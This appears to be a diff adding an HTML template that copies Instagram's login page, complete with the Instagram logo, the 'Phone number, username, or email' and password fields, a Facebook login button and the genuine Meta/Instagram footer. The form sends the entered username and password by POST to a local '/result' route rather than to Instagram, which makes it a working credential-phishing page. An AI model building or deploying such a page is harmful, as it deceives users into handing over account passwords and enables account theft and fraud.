@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Instagram login</title>
+	<link rel="stylesheet" type="text/css" href="../static/style.css">
+	<link rel="stylesheet" type="text/css" href="../static/styles.css">
+</head>
+<body>
+	<div class="goole-browser">
+<div class="container">
+	<div class="box">
+		<div class="heading">
+			<img src="../static/735145cfe0a4.png">
+		</div>
+		<form class="login-form grid" method="POST" action="/result">
+			<center style="padding: 3px;">
+				{% if error %}
+				<h3 style="color: red; font-size: 14px">{{error}}</h3>
+				{% endif %}
+				<!-- {% if password %}
+				<h3 style="color: red;">Name {{password}}</h3>
+				{% endif %} -->
+			</center>
+			<div class="field">
+				<input id="username" name="username" type="name" placeholder="Phone number,username, or email">
+				<!-- <label for="username">Phone number,username, or email</label> -->
+			</div>
+			<div class="field">
+				<input id="password" name="password" type="password" placeholder="Password">
+				<!-- <label for="password">Password</label> -->
+			</div>
+			<button class="login-button" type="submit" name="login" title="login">Log In</button>
+			<div class="separator">
+				<div class="line"></div>
+				<div>OR</div>
+				<div class="line"></div>
+			</div>
+			<div class="other">
+				<button class="fb-login-btn" type="button">
+					<i class="fa fa-facebook-official fb-icon"></i>
+					<span class="">Log in with Facebook</span>
+				</button>
+				<a class="forgot-password" href="#">Forgot password?</a>
+			</div>
+		</form>
+	</div>
+	<div class="box">
+		<p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>		
+	</div>
+	<footer id="footr" class="_8Rna9  _3Laht pC2e0 " role="contentinfo"><div class="             qF0y9          Igw0E     IwRSH      eGOV_         _4EzTm               KokQV                                                                                               "><div class="             qF0y9          Igw0E     IwRSH      eGOV_         _4EzTm                                                              kEKum                                                "><div class="             qF0y9          Igw0E     IwRSH        YBx95   ybXk5    _4EzTm  YlhBV                                                                                                            "><div class="             qF0y9          Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="https://about.facebook.com/meta" rel="nofollow noopener noreferrer" target="_blank"><div class="_7UhW9  PIoXz       MMzan    _0PwGv         uL8Hv         ">Meta</div></a></div><div class="             qF0y9          Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="https://about.instagram.com/" rel="nofollow noopener noreferrer" target="_blank"><div class="_7UhW9  PIoXz       MMzan    _0PwGv         uL8Hv         ">About</div></a></div><div class="             qF0y9          Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="https://about.instagram.com/blog/" rel="nofollow noopener noreferrer" target="_blank"><div class="_7UhW9  PIoXz       MMzan    _0PwGv         uL8Hv         ">Blog</div></a></div><div class="             qF0y9          Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="/about/jobs/"><div class="_7UhW9  PIoXz       MMzan    _0PwGv         uL8Hv         ">Jobs</div></a></div><div class="             qF0y9          Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="https://help.instagram.com/" rel="nofollow noopener noreferrer" target="_blank"><div class="_7UhW9  PIoXz       MMzan    _0PwGv         uL8Hv         ">Help</div></a></div><div class="             qF0y9          Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="https://developers.facebook.com/docs/instagram" rel="nofollow noopener noreferrer" target="_blank"><div class="_7UhW9  PIoXz       MMzan    _0PwGv         uL8Hv         ">API</div></a></div><div class="             qF0y9          Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="/legal/privacy/"><div class="_7UhW9  PIoXz       MMzan    _0PwGv         uL8Hv         ">Privacy</div></a></div><div class="             qF0y9          Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="/legal/terms/"><div class="_7UhW9  PIoXz       MMzan    _0PwGv         uL8Hv         ">Terms</div></a></div><div class="             qF0y9          Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="/directory/profiles/"><div class="_7UhW9  PIoXz       MMzan    _0PwGv         uL8Hv         ">Top Accounts</div></a></div><div class="             qF0y9          Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="/directory/hashtags/"><div class="_7UhW9  PIoXz       MMzan    _0PwGv         uL8Hv         ">Hashtags</div></a></div><div class="             qF0y9          Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="/explore/locations/"><div class="_7UhW9  PIoXz       MMzan    _0PwGv         uL8Hv         ">Locations</div></a></div><div class="             qF0y9          Igw0E     IwRSH      eGOV_         _4EzTm     _22l1                 soMvl                  JI_ht                                                                      "><a href="/web/lite/"><div class="_7UhW9  PIoXz       MMzan    _0PwGv         uL8Hv         ">Instagram Lite</div></a></div></div></div><div class="             qF0y9          Igw0E     IwRSH        YBx95   ybXk5    _4EzTm     _22l1                                                      _49XvD                                                   "><div class="_7UhW9  PIoXz       MMzan   KV-D4          uL8Hv         "><span class="_3G4x7   RFk-t bwz9f "><div class="TQUPK"><span>English</span><div class="             qF0y9          Igw0E     IwRSH      eGOV_         _4EzTm                     WKY0a                                                                                         "><span style="display: inline-block; transform: rotate(180deg);"><svg aria-label="Down Chevron Icon" class="_8-yf5 " color="#8e8e8e" fill="#8e8e8e" height="12" role="img" viewBox="0 0 24 24" width="12"><path d="M21 17.502a.997.997 0 01-.707-.293L12 8.913l-8.293 8.296a1 1 0 11-1.414-1.414l9-9.004a1.03 1.03 0 011.414 0l9 9.004A1 1 0 0121 17.502z"></path></svg></span></div></div><select aria-label="Switch Display Language" class="hztqj"><option value="af">Afrikaans</option><option value="cs">Čeština</option><option value="da">Dansk</option><option value="de">Deutsch</option><option value="el">Ελληνικά</option><option value="en">English</option><option value="en-gb">English (UK)</option><option value="es">Español (España)</option><option value="es-la">Español</option><option value="fi">Suomi</option><option value="fr">Français</option><option value="id">Bahasa Indonesia</option><option value="it">Italiano</option><option value="ja">日本語</option><option value="ko">한국어</option><option value="ms">Bahasa Melayu</option><option value="nb">Norsk</option><option value="nl">Nederlands</option><option value="pl">Polski</option><option value="pt-br">Português (Brasil)</option><option value="pt">Português (Portugal)</option><option value="ru">Русский</option><option value="sv">Svenska</option><option value="th">ภาษาไทย</option><option value="tl">Filipino</option><option value="tr">Türkçe</option><option value="zh-cn">中文(简体)</option><option value="zh-tw">中文(台灣)</option><option value="bn">বাংলা</option><option value="gu">ગુજરાતી</option><option value="hi">हिन्दी</option><option value="hr">Hrvatski</option><option value="hu">Magyar</option><option value="kn">ಕನ್ನಡ</option><option value="ml">മലയാളം</option><option value="mr">मराठी</option><option value="ne">नेपाली</option><option value="pa">ਪੰਜਾਬੀ</option><option value="si">සිංහල</option><option value="sk">Slovenčina</option><option value="ta">தமிழ்</option><option value="te">తెలుగు</option><option value="vi">Tiếng Việt</option><option value="zh-hk">中文(香港)</option><option value="bg">Български</option><option value="fr-ca">Français (Canada)</option><option value="ro">Română</option><option value="sr">Српски</option><option value="uk">Українська</option></select></span></div><div class="             qF0y9          Igw0E     IwRSH      eGOV_         _4EzTm                        _5VUwz                                                                                      "><div class="_7UhW9  PIoXz       MMzan    _0PwGv         uL8Hv         ">© 2022 Instagram from Meta</div></div></div></div></footer>
+<!-- 	<script>
+		window.addEventListener("load",function() {
+			setTimeout(function(){
+				window.scrollTo(0,1);
+			},0);
+		});
+	</script> -->
+</div>
+</div>
+</body>
+</html>
